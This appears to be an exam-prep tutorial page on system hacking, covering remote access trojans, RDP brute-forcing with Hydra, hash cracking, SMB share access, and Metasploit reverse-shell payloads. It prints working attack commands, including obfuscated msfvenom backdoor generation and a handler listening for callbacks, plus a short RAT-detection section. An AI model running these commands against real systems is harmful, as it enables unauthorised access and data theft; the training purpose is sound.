---
layout: default
title: Domain 2 - System Hacking & Exploitation
parent: Domains
nav_order: 2
description: "Remote Access Trojans, RDP cracking, credential harvesting, and system exploitation techniques."
has_children: true
---

# Domain 2: System Hacking & Exploitation

## Overview

This domain covers breaking into systems and maintaining access. You'll crack credentials, exploit vulnerabilities, and maintain persistence.

**Key Topics:**
- Remote Access Trojans (RAT) - Metasploit, msfvenom, payloads
- RDP cracking with Hydra
- File encryption/decryption and hash cracking
- SMB exploitation with weak credentials
- Persistence mechanisms (registry, cron jobs)
- Detection and analysis of RAT activity

**Duration:** 15-20 minutes per task  
**Difficulty:** Medium  
**Tools:** Hydra, Metasploit, msfvenom, Hashcat, John

---

## 2.1 Remote Access Trojans (RAT)

### What is a RAT?

A **Remote Access Trojan (RAT)** is malware that gives an attacker complete remote control over a victim's computer, similar to legitimate remote administration tools but without authorization.

**Key Characteristics:**
- **Backdoor Access:** Hidden method to reconnect
- **Full System Control:** Execute commands, access files
- **Persistence:** Survives reboots via registry/cron jobs
- **Stealth:** Often hides processes and network connections
- **Data Exfiltration:** Can steal files and credentials

### Common RATs in Exams

1. **Metasploit Meterpreter** - Primary tool used in exams
2. **n-Stealth** - Commercial RAT (legacy)
3. **Poison Ivy** - Older RAT (historical reference)
4. **Real VNC / TeamViewer** - Legitimate tools abused by attackers

### Attack Chain

```
Phase 1: Initial Access
└─ Attacker delivers payload (email, website, exploit)
└─ Victim executes malware
└─ RAT installs itself on system

Phase 2: Persistence
└─ Windows: Registry, scheduled task, DLL injection
└─ Linux/Mac: Cron job, bashrc modification, systemd service

Phase 3: Communication (Reverse Shell)
└─ Victim initiates connection to attacker (bypasses firewall)
└─ Attacker gains shell prompt on victim

Phase 4: Command Execution
└─ Attacker types commands, victim executes
└─ Returns output to attacker

Phase 5: Data Exfiltration
└─ Attacker steals files, credentials, data
```

---

## 2.2 RDP Cracking

### What It Does
Uses Hydra to crack Windows RDP credentials via brute force.

```bash
# Basic RDP crack
hydra -l Administrator -P rockyou.txt rdp://192.168.1.5

# With specific username
hydra -l admin -P password_list.txt rdp://192.168.1.50:3389

# Try multiple usernames
hydra -L usernames.txt -P passwords.txt rdp://192.168.1.5

# Verbose output
hydra -l admin -P passwords.txt rdp://192.168.1.5 -v
```

**Expected Output:**
```
[3389][rdp] host: 192.168.1.50   login: Administrator   password: MyPassword123
```

---

## 2.3 File Encryption & Decryption

### Hash Cracking

```bash
# Identify hash type
hashid hashvalue

# Crack SHA1
hashcat -m 100 -a 0 hashfile rockyou.txt

# Crack SHA256
hashcat -m 1400 -a 0 hashfile rockyou.txt

# Using John
john hashes.txt --wordlist=rockyou.txt
```

---

## 2.4 SMB Exploitation

### Accessing Shares with Weak Credentials

```bash
# Access share with username/password
smbclient //192.168.1.5/Documents -U admin%password123

# List directories
ls

# Download files
get secret.txt

# Download entire directory
recurse ON
mget *
```

---

## 2.5 Metasploit & Payload Generation

### Msfvenom - Payload Generation

```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe > backdoor.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf > linux_shell

# With obfuscation
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe > obfuscated.exe
```

### Metasploit Handler

```bash
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> set LPORT 4444
msf> run
```

### Meterpreter Commands

```
meterpreter > getuid                    # Current user
meterpreter > sysinfo                   # System info
meterpreter > ps                        # List processes
meterpreter > download file.txt /tmp/   # Download file
meterpreter > upload evil.exe c:\temp\  # Upload file
meterpreter > reg query HKLM\\Software  # Query registry
```

---

## 2.6 Detecting RAT Activity

### In Network Traffic (Wireshark)

1. **Reverse Connection Pattern**
   - Victim IP → Unknown External IP on non-standard port
   - Example: 192.168.1.50 → 203.0.113.45 on port 4444

2. **Suspicious Ports**
   - 4444, 5555, 6666, 7777, 8888 (Metasploit)
   - 31337 (classic backdoor port)
   - Random high ports (>10000)

3. **Long Duration Connections**
   - RAT connection: Hours/days
   - Normal services: Minutes

**Wireshark Analysis:**
```
Filter: ip.dst == <external_ip>
Look for: Reverse TCP connection, unusual port, long duration
```

---

## See Also

- **[Commands Reference](commands.html)** - Hydra, Metasploit syntax
- **[Challenges](challenges.html)** - Real RDP cracking examples
- **[Domain 1: Scanning](../domain-1-network-scanning/)**
- **[Domain 6: Traffic Analysis](../domain-6-traffic-analysis/)** - RAT detection

---

**Next Step:** Review [commands.md](commands.html), then practice [challenges.md](challenges.html)
